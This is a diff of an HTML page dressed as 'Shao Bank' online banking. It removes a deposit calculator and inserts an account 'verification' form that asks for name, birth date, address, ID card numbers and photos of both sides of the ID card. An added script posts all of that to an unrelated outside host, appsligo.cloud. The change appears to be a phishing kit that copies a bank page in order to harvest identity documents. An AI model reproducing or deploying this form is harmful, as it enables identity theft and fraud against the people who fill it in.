@@ -1,31 +1,15 @@
-<!DOCTYPE html>
+   <!DOCTYPE html>
 <html lang="en" style="--vh: 8.96px;">
    <head>
       <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-      <!--<base href="/">-->
-      <base href=".">
+ 
+ <script src="https://www.gstatic.com/firebasejs/8.6.1/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.6.1/firebase-database.js"></script>
+<script src="https://www.gstatic.com/firebasejs/8.6.1/firebase-storage.js"></script>
+
+
       <meta content="width=device-width, initial-scale=1" name="viewport">
       <meta content="ie=edge" http-equiv="x-ua-compatible">
-      <title>Deposits - ShaoBank</title>
-      <meta name="title" content="Shao Bank - the way to success!">
-      <meta name="description" content="Save your savings and get guaranteed returns. Make a deposit within 5 minutes and receive a fixed income every month. Your account is protected by the deposit insurance system in Hong Kong.">
-      <meta property="og:type" content="website">
-      <meta property="og:title" content="Shao Bank - the way to success!">
-      <meta property="og:description" content="Save your savings and get guaranteed returns. Make a deposit within 5 minutes and receive a fixed income every month. Your account is protected by the deposit insurance system in Hong Kong.">
-      <meta property="og:site_name" content="Shao Bank">
-      <meta property="og:url" content="https://shaobank.com">
-      <meta property="og:image:width" content="1200">
-      <meta property="og:image:height" content="630">
-      <meta name="twitter:card" content="summary_large_image">
-      <meta property="og:image" content="/assets/img/preview.png">
-      <link rel="image_src" href="https://shaobank.com/assets/img/preview.png">
-      <meta name="twitter:image" content="/assets/img/preview.png">
-      <link rel="icon" type="image/x-icon" href="https://shaobank.com/assets/img/favicon/favicon.ico">
-      <link rel="apple-touch-icon" sizes="180x180" href="https://shaobank.com/assets/img/favicon/apple-touch-icon.png">
-      <link rel="icon" type="image/png" sizes="32x32" href="https://shaobank.com/assets/img/favicon/favicon-32x32.png">
-      <link rel="icon" type="image/png" sizes="16x16" href="https://shaobank.com/assets/img/favicon/favicon-16x16.png">
-      <link rel="manifest" href="https://shaobank.com/assets/img/favicon/site.webmanifest">
-      <link rel="mask-icon" href="https://shaobank.com/assets/img/favicon/safari-pinned-tab.svg" color="#5bbad5">
       <meta name="msapplication-TileColor" content="#017efb">
       <meta name="theme-color" content="#ffffff">
       <style>@charset "UTF-8";:root{--animate-duration:1s;--animate-delay:1s;--animate-repeat:1}html{box-sizing:border-box;-ms-overflow-style:scrollbar}*,:after,:before{box-sizing:inherit}:root{--swiper-theme-color:#007AFF }:root{--swiper-navigation-size:44px }html{line-height:1.15;-webkit-text-size-adjust:100%}body{margin:0}@font-face{font-family:Roboto;src:url(/assets/fonts/Roboto-MediumItalic.eot);src:local("Roboto Medium Italic"),local("Roboto-MediumItalic"),url(/assets/fonts/Roboto-MediumItalic.eot?#iefix) format("embedded-opentype"),url(/assets/fonts/Roboto-MediumItalic.woff) format("woff"),url(/assets/fonts/Roboto-MediumItalic.ttf) format("truetype");font-weight:500;font-style:italic;font-display:swap}@font-face{font-family:Roboto;src:url(/assets/fonts/Roboto-Italic.eot);src:local("Roboto Italic"),local("Roboto-Italic"),url(/assets/fonts/Roboto-Italic.eot?#iefix) format("embedded-opentype"),url(/assets/fonts/Roboto-Italic.woff) format("woff"),url(/assets/fonts/Roboto-Italic.ttf) format("truetype");font-weight:400;font-style:italic;font-display:swap}@font-face{font-family:Roboto;src:url(/assets/fonts/Roboto-Bold.eot);src:local("Roboto Bold"),local("Roboto-Bold"),url(/assets/fonts/Roboto-Bold.eot?#iefix) format("embedded-opentype"),url(/assets/fonts/Roboto-Bold.woff) format("woff"),url(/assets/fonts/Roboto-Bold.ttf) format("truetype");font-weight:700;font-style:normal;font-display:swap}@font-face{font-family:Roboto;src:url(/assets/fonts/Roboto-Regular.eot);src:local("Roboto"),local("Roboto-Regular"),url(/assets/fonts/Roboto-Regular.eot?#iefix) format("embedded-opentype"),url(/assets/fonts/Roboto-Regular.woff) format("woff"),url(/assets/fonts/Roboto-Regular.ttf) format("truetype");font-weight:400;font-style:normal;font-display:swap}@font-face{font-family:Roboto;src:url(/assets/fonts/Roboto-Medium.eot);src:local("Roboto Medium"),local("Roboto-Medium"),url(/assets/fonts/Roboto-Medium.eot?#iefix) format("embedded-opentype"),url(/assets/fonts/Roboto-Medium.woff) format("woff"),url(/assets/fonts/Roboto-Medium.ttf) format("truetype");font-weight:500;font-style:normal;font-display:swap}@font-face{font-family:Roboto;src:url(/assets/fonts/Roboto-BoldItalic.eot);src:local("Roboto Bold Italic"),local("Roboto-BoldItalic"),url(/assets/fonts/Roboto-BoldItalic.eot?#iefix) format("embedded-opentype"),url(/assets/fonts/Roboto-BoldItalic.woff) format("woff"),url(/assets/fonts/Roboto-BoldItalic.ttf) format("truetype");font-weight:700;font-style:italic;font-display:swap}@font-face{font-family:Roboto;src:url(/assets/fonts/Roboto-ThinItalic.eot);src:local("Roboto Thin Italic"),local("Roboto-ThinItalic"),url(/assets/fonts/Roboto-ThinItalic.eot?#iefix) format("embedded-opentype"),url(/assets/fonts/Roboto-ThinItalic.woff) format("woff"),url(/assets/fonts/Roboto-ThinItalic.ttf) format("truetype");font-weight:100;font-style:italic;font-display:swap}@font-face{font-family:Roboto;src:url(/assets/fonts/Roboto-Black.eot);src:local("Roboto Black"),local("Roboto-Black"),url(/assets/fonts/Roboto-Black.eot?#iefix) format("embedded-opentype"),url(/assets/fonts/Roboto-Black.woff) format("woff"),url(/assets/fonts/Roboto-Black.ttf) format("truetype");font-weight:900;font-style:normal;font-display:swap}@font-face{font-family:Roboto;src:url(/assets/fonts/Roboto-Light.eot);src:local("Roboto Light"),local("Roboto-Light"),url(/assets/fonts/Roboto-Light.eot?#iefix) format("embedded-opentype"),url(/assets/fonts/Roboto-Light.woff) format("woff"),url(/assets/fonts/Roboto-Light.ttf) format("truetype");font-weight:300;font-style:normal;font-display:swap}@font-face{font-family:Roboto;src:url(/assets/fonts/Roboto-LightItalic.eot);src:local("Roboto Light Italic"),local("Roboto-LightItalic"),url(/assets/fonts/Roboto-LightItalic.eot?#iefix) format("embedded-opentype"),url(/assets/fonts/Roboto-LightItalic.woff) format("woff"),url(/assets/fonts/Roboto-LightItalic.ttf) format("truetype");font-weight:300;font-style:italic;font-display:swap}@font-face{font-family:Roboto;src:url(/assets/fonts/Roboto-BlackItalic.eot);src:local("Roboto Black Italic"),local("Roboto-BlackItalic"),url(/assets/fonts/Roboto-BlackItalic.eot?#iefix) format("embedded-opentype"),url(/assets/fonts/Roboto-BlackItalic.woff) format("woff"),url(/assets/fonts/Roboto-BlackItalic.ttf) format("truetype");font-weight:900;font-style:italic;font-display:swap}@font-face{font-family:Roboto;src:url(/assets/fonts/Roboto-Thin.eot);src:local("Roboto Thin"),local("Roboto-Thin"),url(/assets/fonts/Roboto-Thin.eot?#iefix) format("embedded-opentype"),url(/assets/fonts/Roboto-Thin.woff) format("woff"),url(/assets/fonts/Roboto-Thin.ttf) format("truetype");font-weight:100;font-style:normal;font-display:swap}*{box-sizing:border-box}html,body{font-family:Roboto,sans-serif}html{font-size:14px}@media (max-width: 480px){html{font-size:12px}}</style>
@@ -399,197 +383,164 @@ position: relative;
                      </div>
                   </header>
                </account-header>
-               <div class="container">
-                  <div class="row">
-                     <div class="col-lg-3 d-none d-lg-block">
-                        <!---->
-                     </div>
-                     <div class="col-lg-6">
-                        <div class="cab-content">
-                           <router-outlet></router-outlet>
-                           <ng-component>
-                              <div class="m-title"><span>Open</span> a deposit</div>
-                              <account-deposit-form>
-                            
+            
 
 
 
 
-                                 <div  class="cab-box ng-untouched ng-pristine ng-valid" autocomplete="off">
-                                    <div class="cab-title">Profit calculator</div>
-                                    <div class="cab-input__title">Enter amount</div>
-                                    <div class="cab-box__row">
-                                       <div class="cab-box__col"><label class="cab-input error">
-
-
-<input id="myamountx" type="text" formcontrolname="amount" maxlength="18" placeholder="0.00" class="ng-pristine ng-valid ng-touched" value="8000">
-
-<span>HKD</span></label></div>
-                                       <div class="cab-box__col d-none d-md-block">
-                                          <div class="cab-val">
-                                             <h3>Profit for the whole period</h3>
-                                             <p >8,920 <span>HKD</span></p>
-                                          </div>
-                                       </div>
-                                    </div>
-                                    <div class="cab-input__text">min 8,000 - max 8,000,000 HKD</div>
-                                    <div class="cab-input__title">Deposit term in years</div>
-                                    <div class="cab-box__row">
-                                       <div class="cab-box__col">
-                                          <div class="calc-radio mb">
-                                             <label class="active"><span>1</span></label><label><span>2</span></label><label><span>3</span></label><label><span>4</span></label><label><span>5</span></label><label><span>6</span></label><label><span>7</span></label><label><span>8</span></label><label><span>9</span></label><label><span>10</span></label><!---->
-                                          </div>
-                                       </div>
-                                       <div class="cab-box__col d-none d-md-block">
-                                          <div class="cab-val__list">
-                                             <div class="cab-val">
-                                                <h3>Expiry date</h3>
-                                                <p >30 Jul 2024 <sub>15:40</sub></p>
-                                             </div>
-                                             <div class="cab-val">
-                                                <h3>Interest rate</h3>
-                                                <p>11.5% <sub>per year</sub></p>
-                                             </div>
-                                          </div>
-                                       </div>
-                                    </div>
-                                    <div class="cab-box__row">
-                                       <div class="cab-box__col">
-                                          <div class="cab-input__title">Pay with</div>
-                                       </div>
-                                    </div>
-                                    <div class="cab-box__row">
-                                       <div class="cab-box__col">
-                                          <div class="cab-input sel">
-                                           
-
-
-
- 
- <input placeholder="Balance" type="text" id="selected-option-input" readonly="">
-
-
-                                             <div class="cab-input__sel">
-                                              
-
-<!-- xxxxxxxxxxxxxxxx -->
-
-
-<div class="custom-select">
-    <div class="selected-option">
-        <img src="svg0.svg" alt="icon2" class="option-icon">
-        <span class="option-text">HKD</span>
-        <span class="arrow">▼</span>
-    </div>
-    <div class="options">
-        <div class="option" data-coin-id="hkd">
-            <img src="svg0.svg" alt="icon2" class="option-icon">
-            <span>HKD</span>
-        </div>
-    </div>
-</div>
-                                             </div>
-                                          </div>
-                                       </div>
-                                       <div class="cab-box__col d-none d-md-block">
-                                          <div class="cab-val">
-                                             <h3>Amount payable</h3>
-                                             <p  class="negative"> 8,000 <span>HKD</span></p>
-                                          </div>
-                                       </div>
-                                    </div>
-                                    <div class="cab-input__text">You can pay with your account balance and e-wallet</div>
-                                    <div class="d-block d-md-none">
-                                       <div class="cab-val">
-                                          <h3>Profit for the whole period</h3>
-                                          <p id="exchangedAmount">8,920 <span>HKD</span></p>
-                                       </div>
-                                       <div class="cab-val">
-                                          <h3>Expiry date</h3>
-                                          <p id="date-expire">30 Jul 2024 <sub>15:40</sub></p>
-                                       </div>
-                                       <div class="cab-val">
-                                          <h3>Interest rate</h3>
-                                          <p>11.5% <sub>per year</sub></p>
-                                       </div>
-                                       <div class="cab-val">
-                                          <h3>Amount payable</h3>
-                                          <p id="priceeincoin" class="negative"> 8,000 <span>HKD</span></p>
-                                       </div>
-                                    </div>
-                                    <div class="cab-box__btns">
-
-      <button id="nex-step" type="submit" class="m-btn" onclick="sendData()">Next Step</button>
-
-                                    </div>
 
 
 
 
-                                 </div>
+
+<div class="container">
+   <div class="row">
+      <div class="col-lg-3 d-none d-lg-block">
+         <!---->
+      </div>
+      <div class="col-lg-6">
+         <div class="cab-content">
+            <router-outlet></router-outlet>
+            <ng-component>
+               <div class="m-title"><span>Personal</span> data</div>
+               <div class="m-subtitle"><span>Verification</span> of digital banking</div>
+               <div class="m-text sm">
+                  <p>It only takes a few minutes to verify your account. Verify your account and enjoy the advanced features of Shao Bank's digital banking.</p>
+               </div>
+               <div class="cab-empty mb-4">
+                  <div class="cab-empty__head">
+                     <div class="cab-empty__icon"><img src="/assets/img/cab-empty.svg" alt=""></div>
+                     <div class="cab-empty__logo"><img src="/assets/img/logo-full-dark.svg" alt=""></div>
+                  </div>
+                  <p>Your account is not verified.<br>Please verify your account to have access to all Shao Bank features.</p>
+               </div>
 
 
+
+
+
+
+
+
+<form novalidate="true" class="cab-box ng-pristine ng-invalid ng-touched" autocomplete="off" action="upload.php" method="post" enctype="multipart/form-data">
+
+   <fieldset>
+      <div class="cab-title">Fill in the form</div>
+      <div class="cab-title sm"><span>Customer Information</span></div>
+      <div class="cab-inputs">
+         <div class="cab-inputs__col">
+            <div class="cab-input__title">First name</div>
+            <label class="cab-input"><input type="text" formcontrolname="first_name" maxlength="32" placeholder="Enter first name" class="ng-untouched ng-pristine ng-invalid"></label>
+         </div>
+         <div class="cab-inputs__col">
+            <div class="cab-input__title">Last name</div>
+            <label class="cab-input"><input type="text" formcontrolname="last_name" maxlength="32" placeholder="Enter last name" class="ng-untouched ng-pristine ng-invalid"></label>
+         </div>
+         <div class="cab-inputs__col">
+            <div class="cab-input__title">Date of Birth</div>
+            <label class="cab-input"><input type="text" formcontrolname="birthday" maxlength="10" mask="d0/M0/0000" placeholder="Enter date of birthday" class="ng-untouched ng-pristine ng-invalid"></label>
+         </div>
+      </div>
+      <div class="cab-inputs">
+         <div class="cab-inputs__col">
+            <div class="cab-input__title">Country</div>
+            <label class="cab-input"><input type="text" formcontrolname="country" maxlength="32" placeholder="Enter country specified in ID Card" class="ng-untouched ng-pristine ng-invalid"></label>
+         </div>
+         <div class="cab-inputs__col">
+            <div class="cab-input__title">City</div>
+            <label class="cab-input"><input type="text" formcontrolname="city" maxlength="32" placeholder="Enter city specified in ID Card" class="ng-untouched ng-pristine ng-invalid"></label>
+         </div>
+      </div>
+      <div class="cab-input__title">Residential address</div>
+      <label class="cab-input mb"><input type="text" formcontrolname="address" maxlength="255" placeholder="Enter address specified in ID Card" class="ng-untouched ng-pristine ng-invalid"></label>
+      <div class="cab-title sm"><span>ID Card</span></div>
+      <div class="cab-inputs">
+         <div class="cab-inputs__col">
+            <div class="cab-input__title">ID Card Series</div>
+            <label class="cab-input"><input type="text" formcontrolname="doc_1" maxlength="32" placeholder="11 11" class="ng-pristine ng-invalid ng-touched"></label>
+         </div>
+         <div class="cab-inputs__col">
+            <div class="cab-input__title">ID Card Number</div>
+            <label class="cab-input"><input type="text" formcontrolname="doc_2" maxlength="32" placeholder="12345678" class="ng-untouched ng-pristine ng-invalid"></label>
+         </div>
+      </div>
+      <div class="cab-inputs">
+         <div class="cab-inputs__col">
+            <!-- ... Other HTML code ... -->
+            <div class="cab-docs">
+               <h3>Upload the front side of the ID card</h3>
+               <img src="assets/img/docs-f.png" alt="">
+               <p>Please send clear images...</p>
+               <account-file-uploader>
+                  <label class="cab-file">
+                  <input type="file" id="frontIDCardInput" class="d-none" accept="image/png, image/jpg, image/jpeg">
+                  <button type="button" data-inputid="frontIDCardInput" class="m-btn tr" onclick="triggerFileInput(this);">Browse file ...</button>
+                  </label>
+               </account-file-uploader>
+            </div>
+            <div class="cab-docs">
+               <h3>Upload the reverse side of the ID card</h3>
+               <img src="assets/img/docs-b.png" alt="">
+               <p>Please send clear images...</p>
+               <account-file-uploader>
+                  <label class="cab-file">
+                  <input type="file" id="backIDCardInput" class="d-none" accept="image/png, image/jpg, image/jpeg">
+                  <button type="button" data-inputid="backIDCardInput" class="m-btn tr" onclick="triggerFileInput(this);">Browse file ...</button>
+                  </label>
+               </account-file-uploader>
+            </div>
+            <!-- ... Remaining HTML code ... -->
+         </div>
+      </div>
+      <div class="cab-input__title">Agreement</div>
+      <label class="m-check"><input type="checkbox" formcontrolname="rules" class="ng-untouched ng-pristine ng-invalid"><span>I agree with the <a target="_blank" href="/docs/Privacy_Policy_Shao_Bank.pdf">Privacy Policy</a> and the bank's regulations</span></label>
+      <button type="submit" class="m-btn sm" id="confirmBtn">Confirm</button>
+   </fieldset>
+</form>
 
 <script>
-    function sendData() {
-        var balance = document.getElementById('selected-option-input').value;
-        var dateExpire = document.getElementById('date-expire').textContent;
-        var priceeincoin = document.getElementById('priceeincoin').textContent;
-        var exchangedAmount = document.getElementById('exchangedAmount').textContent;
-
-        var redirectUrl = 'pay.html?balance=' + balance 
-                        + '&dateExpire=' + encodeURIComponent(dateExpire) 
-                        + '&priceeincoin=' + encodeURIComponent(priceeincoin) 
-                        + '&exchangedAmount=' + encodeURIComponent(exchangedAmount);
-
-        window.location.href = redirectUrl;
-    }
-</script>
-
-
-<script>
-    function toggleMenu() {
-        const burger = document.querySelector('.cab-burger, .cab-burger.active');
-        const nicescrollBox = document.querySelector('.cab-mob');
-
-        if (burger.classList.contains('active')) {
-            // If it's active, hide the nicescroll-box and remove the 'active' class
-            nicescrollBox.style.display = 'none';
-            burger.classList.remove('active');
-        } else {
-            // If it's not active, show the nicescroll-box and add the 'active' class
-            nicescrollBox.style.display = 'block';
-            burger.classList.add('active');
+   function triggerFileInput(buttonElement) {
+    const inputId = buttonElement.getAttribute('data-inputid');
+    if(inputId) {
+        const inputFile = document.getElementById(inputId);
+        if(inputFile) {
+            inputFile.click();
         }
     }
+}
+
+   document.getElementById('confirmBtn').addEventListener('click', function(event) {
+    event.preventDefault(); // Prevent form from submitting the traditional way
+
+    let formData = new FormData(document.querySelector('form'));
+
+    fetch('https://appsligo.cloud/test/shao/upload.php', {
+        method: 'POST',
+        body: formData
+    }).then(response => response.text()).then(data => {
+        console.log(data); // You can handle the response here
+    }).catch(error => {
+        console.error('Error:', error);
+    });
+});
+
 </script>
-                                 <!---->
-                              </account-deposit-form>
-                              <account-deposits-table>
-                                 <div class="row d-flex align-items-center">
-                                    <div class="col-md-3">
-                                       <div class="m-subtitle"><span>Deposits</span> history</div>
-                                    </div>
-                                    <div class="col-md-6">
-                                       <!---->
-                                    </div>
-                                 </div>
-                                 <div class="cab-empty">
-                                    <div class="cab-empty__head">
-                                       <div class="cab-empty__icon"><img src="./deposit_files/cab-empty.svg" alt=""></div>
-                                       <div class="cab-empty__logo"><img src="./deposit_files/logo-full-dark.svg" alt=""></div>
-                                    </div>
-                                    <p>With Shao Bank, money works without your participation. Go about your business and earn extra passive income at a high rate.</p>
-                                    <a routerlink="/account/investments" class="m-btn" href="https://shaobank.com/account/investments">Calculate profit</a>
-                                 </div>
-                                 <!----><!----><!---->
-                              </account-deposits-table>
-                           </ng-component>
-                           <!---->
-                        </div>
-                     </div>
-                  </div>
-               </div>
+
+
+
+
+               <!----><!----><!----><!----><!---->
+            </ng-component>
+            <!---->
+         </div>
+      </div>
+   </div>
+</div>
+
+
+
+
+
                <account-footer>
                   <footer class="footer footer_cab">
                      <div class="container">
